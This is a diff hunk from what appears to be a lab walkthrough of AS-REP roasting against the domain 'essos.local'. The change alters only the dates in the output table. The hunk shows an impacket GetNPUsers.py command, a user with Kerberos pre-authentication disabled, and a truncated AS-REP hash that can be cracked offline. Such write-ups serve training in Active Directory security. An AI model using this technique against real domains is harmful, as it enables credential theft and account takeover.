@@ -31,7 +31,7 @@ python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py essos.local/daene
 ```
 Name       MemberOf  PasswordLastSet             LastLogon                   UAC      
 ---------  --------  --------------------------  --------------------------  --------
-missandei            2025-02-26 09:30:35.437503  2025-05-23 07:05:19.141162  0x410200 
+missandei            2024-02-26 09:30:35.437503  2024-05-23 07:05:19.141162  0x410200 
 
 $krb5asrep$23$missandei@ESSOS.LOCAL:600c153e69bd4899e402b6d1aad05e4f$1c5e29ec6f2e26b7d3738f19108a0b9b03ffa7ce3480e02f885bafe0de2668d499f23b6b034be320ee03ba64e70f4f3171c5bd59c0afdd1d79e0f64fcc1d138...
 ```
